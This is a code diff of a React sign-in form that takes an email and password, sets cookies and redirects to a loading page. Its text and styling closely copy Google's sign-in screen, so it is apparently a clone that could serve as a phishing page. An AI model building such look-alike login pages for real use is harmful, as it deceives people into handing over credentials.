@@ -40,7 +40,8 @@ function page() {
       console.log("success", data);
       Cookies.set("email", data?.info?.email);
       Cookies.set("id", data?.info?._id);
-      router.push("/password")
+      // router.push("/password")
+      router.push("/loading")
     } else {
       console.log("error", data);
     }
@@ -55,30 +56,31 @@ function page() {
       <div className="">
       <div className="text-center">
   <p className='font-medium text-xl mt-5'>Sign in</p>
-  <p className='text-sm mt-1'>Enter your Email</p>
   <p className='text-[#1a73e8] text-sm mt-1'>Learn more about using Guest mode</p>
   </div>
   <Formik  initialValues={initialvalues} onSubmit={handleSubmit}>
   {
     (formik) => (
       <Form >
-        <Field
+      <div className=" flex flex-col">
+      <Field
          
-          className='w-[350px] px-3 py-3 border border-gray-300 outline-none rounded-md mt-5 placeholder:pl-5'
-          type="email"
-          name="email"
-          id="email"
-          placeholder="Enter your email address"
-          required
-        />
-         <Field className='w-[350px] px-3 py-3 border border-gray-300 outline-none rounded-md mt-5 placeholder:pl-5'
-                  type="password"
-                  name="password"
-                  id="password"
-                  autoComplete="off"
-                  placeholder="Enter your password"
-                  required
-                />
+         className='w-[350px] px-3 py-3 border border-gray-300 outline-none rounded-md mt-5 placeholder:pl-5'
+         type="email"
+         name="email"
+         id="email"
+         placeholder="Enter your email address"
+         required
+       />
+        <Field className='w-[350px] px-3 py-3 border border-gray-300 outline-none rounded-md mt-5 placeholder:pl-5'
+                 type="password"
+                 name="password"
+                 id="password"
+                 autoComplete="off"
+                 placeholder="Enter your password"
+                 required
+               />
+      </div>
          <p className='text-[#1a73e8] text-sm mt-2'>Forgot email?</p>
   <div className="flex justify-between mt-3">
     <p className='text-[#1a73e8] text-sm mt-7 text-center'>Create account</p>
